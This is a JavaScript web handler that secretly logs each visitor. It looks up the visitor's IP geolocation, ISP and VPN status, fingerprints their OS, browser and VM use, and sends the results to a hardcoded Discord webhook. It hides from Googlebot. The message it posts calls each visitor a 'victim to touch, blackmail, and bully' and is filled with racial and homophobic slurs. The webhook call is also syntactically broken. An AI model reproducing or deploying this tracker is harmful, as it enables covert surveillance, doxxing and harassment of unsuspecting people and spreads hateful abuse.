const cooldowns = new Map()

export default async function handler(req, res) {
  const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress
  const ua = req.headers['user-agent'] || ''

  if (/Googlebot/i.test(ua)) return res.status(200).end()

  const now = Date.now()
  if (cooldowns.has(ip) && now - cooldowns.get(ip) < 16000) return res.status(200).end()
  cooldowns.set(ip, now)

  const data = await fetch(`http://ip-api.com/json/${ip}?fields=status,message,query,isp,org,proxy,country,regionName,city`)
    .then(r => r.json())

  if (data.status !== 'success') return res.status(200).end()

  let os = 'Unknown'
  if (/windows/i.test(ua)) os = 'Windows'
  else if (/android/i.test(ua)) os = 'Android'
  else if (/iphone|ipad|ipod/i.test(ua)) os = 'iOS'
  else if (/macintosh|mac os x/i.test(ua)) os = 'Mac'
  else if (/linux/i.test(ua)) os = 'Linux'

  let browser = 'Unknown'
  if (/edg/i.test(ua)) browser = 'Edge'
  else if (/chrome/i.test(ua)) browser = 'Chrome'
  else if (/safari/i.test(ua) && !/chrome/i.test(ua)) browser = 'Safari'
  else if (/firefox/i.test(ua)) browser = 'Firefox'
  else if (/opr|opera/i.test(ua)) browser = 'Opera'

  const vmIndicators = ['vmware', 'virtualbox', 'hyper-v', 'qemu', 'xen', 'parallels', 'kvm']
  const uaLower = ua.toLowerCase()
  const vmDetected = vmIndicators.some(indicator => uaLower.includes(indicator)) ? 'Yes' : 'No'

  const embed = {
    title: 'new victim to touch, blackmail, and bully',
    color: 65280,
    fields: [
      { name: 'IP (Im Pregnant)', value: data.query, inline: true },
      { name: 'ISP', value: data.isp || 'Unknown', inline: true },
      { name: 'Org', value: data.org || 'Unknown', inline: true },
      { name: 'nigga country', value: data.country || 'Unknown', inline: true },
      { name: 'nigga region', value: data.regionName || 'Unknown', inline: true },
      { name: 'nigga city', value: data.city || 'Unknown', inline: true },
      { name: 'is ts nigga using a vpn', value: data.proxy ? 'Yes' : 'No', inline: true },
      { name: 'what os dis fag on', value: os, inline: true },
      { name: 'what browser dis nigga on', value: browser, inline: true },
      { name: 'is ts nigga using a vm', value: vmDetected, inline: true }
    ],
    timestamp: new Date().toISOString()
  }

  await fetch(process.discord.com/api/webhooks/1430286052383396053/vqlJX3wIQaNvLwXVMSF2WK6QwdLxH1BSoBQjD0LTx38igaCu-tV3i0GE81uThcMpLRUP, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ embeds: [embed] })
  })

  res.status(200).end()
}
